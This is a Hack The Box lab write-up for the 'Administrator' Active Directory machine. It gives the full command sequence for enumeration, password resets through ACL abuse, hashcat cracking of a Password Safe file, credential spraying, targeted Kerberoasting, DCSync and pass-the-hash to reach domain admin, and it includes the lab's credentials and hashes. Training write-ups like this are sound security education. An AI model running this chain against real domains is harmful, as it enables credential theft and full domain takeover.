# Administrator HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Administrator-orange?logo=hackthebox)](https://app.hackthebox.com/machines/634)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Medium-orange)](https://github.com/subhash00/HTB_Labs/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-green)](https://github.com/subhash00/HTB_Labs/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

This is a complete walkthrough of the **Administrator** box from Hack The Box. The guide covers initial enumeration, pivoting through users, abusing Active Directory weaknesses, password extraction, and privilege escalation to full domain compromise. All commands used during the lab are included, with step-by-step explanations, ensuring replicability and clarity for readers interested in Active Directory exploitation techniques.

---

## Table of Contents

- [Enumeration](#enumeration)
  - [Nmap Scan](#nmap-scan)
  - [Host File Setup](#host-file-setup)
- [BloodHound AD Recon](#bloodhound-ad-recon)
  - [BloodHound Data Collection](#bloodhound-data-collection)
- [Initial Access (Evil-WinRM)](#initial-access-evil-winrm)
- [Privilege Escalation & Password Abuses](#privilege-escalation--password-abuses)
  - [Password Reset & Lateral Movement](#password-reset--lateral-movement)
  - [Check Group Membership](#check-group-membership)
- [FTP & Password Safe Attack](#ftp--password-safe-attack)
  - [FTP Download & Extraction](#ftp-download--extraction)
  - [Password Safe File Cracking](#password-safe-file-cracking)
- [Credential Spraying and Further Access](#credential-spraying-and-further-access)
- [Kerberoasting](#kerberoasting)
  - [Clock Sync](#clock-sync)
  - [Targeted Kerberoasting](#targeted-kerberoasting)
  - [Kerberos Ticket Crack](#kerberos-ticket-crack)
- [Domain Compromise (DCSync & PTH)](#domain-compromise-dcsync--pth)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Technologies Used](#technologies-used)

---

## Enumeration

### Nmap Scan
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.150.113 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC 10.129.150.113
```
Scans all ports quickly on the target machine, enumerates services on discovered ports.

### Host File Setup

`echo "10.129.150.113 administrator.htb" | sudo tee -a /etc/hosts`
Adds the host to `/etc/hosts` for local domain resolution.

---

## BloodHound AD Recon

### BloodHound Data Collection

`bloodhound-python -d administrator.htb -u olivia -p 'ichliebedich' -ns 10.129.150.113 -c All --zip`
Performs an extensive Active Directory data collection with BloodHound using initial user credentials.

---

## Initial Access (Evil-WinRM)

`evil-winrm -i 10.129.150.113 -u olivia -p 'ichliebedich'`

Connects to the target via WinRM as Olivia.

---

## Privilege Escalation & Password Abuses

### Password Reset & Lateral Movement

```
net user michael test12345 /domain
evil-winrm -i 10.129.150.113 -u michael -p 'test12345'
Set-DomainUserPassword -Identity benjamin -AccountPassword (ConvertTo-SecureString "test123456" -AsPlainText -Force) -Credential $YourCredential
```
- Resets Michael’s password via net user (requires control over Michael via ACLs/group membership).
- Uses Michael’s session/rights to reset Benjamin’s domain password using PowerView.

### Check Group Membership

`net user benjamin | Select-String -Pattern "Group"`
Lists group memberships for Benjamin.

---

## FTP & Password Safe Attack

### FTP Download & Extraction

```
ftp benjamin@10.129.150.113
ftp> dir
ftp> get Backup.psafe3
file Backup.psafe3
```
- Connects to the FTP service as Benjamin.
- Lists and downloads the `Backup.psafe3` file.
- Checks the file type of the download.

### Password Safe File Cracking

```
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
pwsafe
```
- Cracks the password safe file with Hashcat.
- Uses `pwsafe` on Linux to open and extract credentials with the cracked password (in walkthrough: `tekieromucho`).

---

## Credential Spraying and Further Access

```
netexec smb 10.129.150.113 -u user.txt -p pass.txt      OR
crackmapexec smb 10.129.150.113 -u user.txt -p pass.txt
evil-winrm -i 10.129.150.113 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
- Uses lists of usernames/passwords from the password safe to spray credentials over SMB.
- Authenticates as Emily after finding valid credentials.

---

## Kerberoasting

### Clock Sync

`sudo ntpdate 10.129.150.113`
Synchronizes local system time with the domain controller to avoid Kerberos skew errors.

### Targeted Kerberoasting

`python3 targetedKerberoast.py --dc-ip 10.129.150.113 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt`
Performs a targeted Kerberoast attack on Ethan using Emily’s session. The `ethan.txt` file should contain the username `ethan`.

### Kerberos Ticket Crack

`hashcat -a 0 -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt`
Cracks the extracted Kerberos TGS hash to recover Ethan’s clear-text password (in walkthrough: `limpbizkit`).

---

## Domain Compromise (DCSync & PTH)

```
impacket-secretsdump -just-dc ADMINISTRATOR.HTB/ethan@10.129.150.113
evil-winrm -i 10.129.150.113 -u Administrator -H'3dc553ce4b9fd20bd016e098d2d2fd2e'
```
- Performs a DCSync attack with Ethan’s credentials to dump domain hashes, including Administrator.
- Uses Pass-the-Hash to log in as Administrator and gain full domain access.

---

## Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
  <img width="1571" height="846" alt="28" src="https://github.com/user-attachments/assets/972a9958-ac87-4d3a-ac7e-d662989b954c" />
<img width="904" height="93" alt="27" src="https://github.com/user-attachments/assets/93d75c81-e2c9-45e9-ac0f-3724cc4e65f9" />
<img width="1896" height="687" alt="26" src="https://github.com/user-attachments/assets/00f66ee9-2800-461c-8b88-83226652d36a" />
<img width="1920" height="896" alt="25" src="https://github.com/user-attachments/assets/d5be9e92-1056-4005-8928-0342d90e9cea" />
<img width="1920" height="900" alt="24" src="https://github.com/user-attachments/assets/3d74557f-0655-4041-88df-3c0c5f71a7e5" />
<img width="1787" height="905" alt="23" src="https://github.com/user-attachments/assets/264cce50-d2a5-4bad-a9b8-c50efded69d6" />
<img width="1562" height="417" alt="22" src="https://github.com/user-attachments/assets/1fcdf0e5-ea8b-4a3b-a8ed-d15288340a8b" />
<img width="959" height="475" alt="21" src="https://github.com/user-attachments/assets/ad1ab480-f665-49e9-90b5-5c064fa8abc5" />
<img width="1805" height="779" alt="20" src="https://github.com/user-attachments/assets/7bbae0c6-69c5-4670-a323-66fd31165cb5" />
<img width="1889" height="844" alt="19" src="https://github.com/user-attachments/assets/99932737-9df8-468a-8000-c28d069dfc92" />
<img width="1559" height="181" alt="18" src="https://github.com/user-attachments/assets/61220322-1a34-40c4-93bb-c9a5c75277d4" />
<img width="1155" height="164" alt="17" src="https://github.com/user-attachments/assets/95634068-31bb-4d43-8851-5e951b8de721" />
<img width="1894" height="702" alt="16" src="https://github.com/user-attachments/assets/bab1ac97-ebde-4455-9efe-295b2d08e2f7" />
<img width="1048" height="299" alt="15" src="https://github.com/user-attachments/assets/a4c12df8-dff7-47a2-a9ac-986566b064a5" />
<img width="949" height="787" alt="14" src="https://github.com/user-attachments/assets/0ca4057e-a7b4-48e4-9673-8c0ae7e77a44" />
<img width="574" height="463" alt="13" src="https://github.com/user-attachments/assets/62bb0b0e-f9bc-473d-975f-2cb88f0ca004" />
<img width="1765" height="823" alt="12" src="https://github.com/user-attachments/assets/2450eb94-f142-487b-ba3f-8eaa9804efe7" />
<img width="1895" height="715" alt="11" src="https://github.com/user-attachments/assets/d824a2d1-5526-44bf-9c79-02d724799d3a" />
<img width="1628" height="410" alt="10" src="https://github.com/user-attachments/assets/4da678c9-f642-4d5f-82c2-ead9b0923d94" />
<img width="1826" height="825" alt="9" src="https://github.com/user-attachments/assets/a194d4b2-2e82-4ebd-890d-7b75fd8d985e" />
<img width="725" height="589" alt="8" src="https://github.com/user-attachments/assets/8f7a2ff6-6cc7-4cdc-8621-19994bad2cc9" />
<img width="966" height="191" alt="7" src="https://github.com/user-attachments/assets/c129b332-e31f-4fba-aad2-6271c392ed19" />
<img width="974" height="359" alt="6" src="https://github.com/user-attachments/assets/ac358c3d-ea9f-4eae-a126-c463a439615a" />
<img width="970" height="719" alt="5" src="https://github.com/user-attachments/assets/f2952da7-5178-481e-acb2-3a8f169acb91" />
<img width="1844" height="698" alt="4" src="https://github.com/user-attachments/assets/62bd1eb6-cc37-4a93-8944-15f29dc3585c" />
<img width="714" height="328" alt="3" src="https://github.com/user-attachments/assets/b8cb48ca-1cf8-4e39-aff6-d6af00702ef0" />
<img width="1421" height="850" alt="2" src="https://github.com/user-attachments/assets/cc2e0427-bd09-445c-a5c9-f3b30b47289d" />
<img width="1613" height="413" alt="1" src="https://github.com/user-attachments/assets/c77fc437-f8c9-4167-8fa4-f9c4112cbd55" />

</details>

---

## Tools Used

- **Nmap** — Network enumeration and port scanning
- **BloodHound** — Active Directory privilege and relationship mapping
- **bloodhound-python** — BloodHound data collector for AD
- **Evil-WinRM** — Remote PowerShell administration for Windows servers
- **PowerView** — PowerShell toolkit for AD enumeration and abuse
- **FTP Client** — File transfer client used for downloading files from Windows FTP service
- **Hashcat** — Password and hash cracker
- **pwsafe** — Password Safe, a tool to open `.psafe3` password database files (Linux version)
- **netexec / crackmapexec** — Credential spraying and SMB enumeration utilities
- **ntpdate** — Clock synchronization utility to fix Kerberos time skew
- **targetedKerberoast.py** — Script for advanced Kerberoasting attacks against specified AD accounts
- **Impacket’s secretsdump.py** — Dumping AD hashes using DCSync attack
- **net user** — Native Windows user management
- **Select-String** — PowerShell search utility

---

## Technologies Used

- **Active Directory (AD)** — Core Windows authentication and directory service, central to all enumeration, privilege escalation and attacks.
- **Kerberos** — Windows authentication protocol, target for Kerberoasting attacks.
- **NTLM** — Windows hash-based authentication, used in password attacks and pass-the-hash.
- **FTP** — File Transfer Protocol, used for moving files between hosts.
- **Password Safe (.psafe3)** — Secure password database format.
- **LDAP** — Lightweight Directory Access Protocol, often used for direct AD enumeration.
- **Resource-Based Constrained Delegation** — (not directly used in this walkthrough, but related to AD abuse and Kerberos).
- **SMB** — Windows file and printer sharing protocol, often the first target for enumeration.
- **DCSync/Replication** — Mechanism for AD DCs to synchronize data, abused for privilege escalation.

---


